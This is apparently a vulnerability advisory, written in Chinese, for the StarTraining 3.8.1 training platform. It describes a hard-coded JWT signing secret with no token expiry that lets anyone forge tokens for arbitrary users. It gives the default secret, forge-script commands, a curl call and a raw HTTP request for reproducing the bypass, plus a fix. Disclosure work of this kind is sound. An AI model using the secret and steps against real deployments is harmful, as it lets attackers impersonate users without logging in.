# StarTraining — JWT 硬编码密钥可伪造身份令牌 (ST-VULN-001)

| 项 | 内容 |
|----|------|
| Vendor | zhistaredu |
| Product | StarTraining（职星学院） |
| Version | 3.8.1 |
| Type | Use of Hard-coded Password |
| CWE | CWE-798 / CWE-287 |
| 认证 | None (offline forge with default secret) |
| 严重度 | Critical |

## 说明

配置里 token.secret 写死成 abcdefghijklmnopqrstuvwxyz。JWT 用 HS512 签，没有 exp。密钥没改的话，谁都能本地伪造任意 user_id / company_id 的 token。

## 根因

密钥写死在 application.yml；createToken 不带过期；parseToken 还会把 secret 和 token 打到 stdout。

## 利用链接 / 复现

本地默认密钥：`abcdefghijklmnopqrstuvwxyz`（`application.yml` → `token.secret`）。

```bash
cd poc_verify
python3 startraining_jwt_forge.py --user-id fa36ec75-160a-47e4-8140-ef1e94c5d329 --company-id 5d70aa10-b5af-4092-b968-d374dd133269
# 把输出的 JWT 塞进 Authorization（不要加 Bearer）

curl -s 'http://127.0.0.1:8900/system/user/getUserInfo' \
  -H "Authorization: $(python3 startraining_jwt_forge.py)"
```

直链（需先伪造 token，不能裸点）：

- `http://127.0.0.1:8900/system/user/getUserInfo`


## 请求包（Yakit）

```http
# Forge: python poc_verify/startraining_jwt_forge.py
GET /system/user/getUserInfo HTTP/1.1
Host: 127.0.0.1:8900
Authorization: FORGED_JWT_HERE
Connection: close
```

期望：Authorization 带伪造 JWT 调 getUserInfo，返回 code=200。

## 截图

![jwt-forge](./screenshots/ST-VULN-001-jwt-forge.png)

## 影响

未登录也能冒充任意用户打业务接口。

## 修复

密钥改成环境变量并轮换；补 exp/iat；删掉调试打印。

## 关联

- 本地报告：`../POC_VERIFICATION_REPORT.md`
- 脚本：`poc_verify/startraining_poc_verify.py` / `startraining_jwt_forge.py`
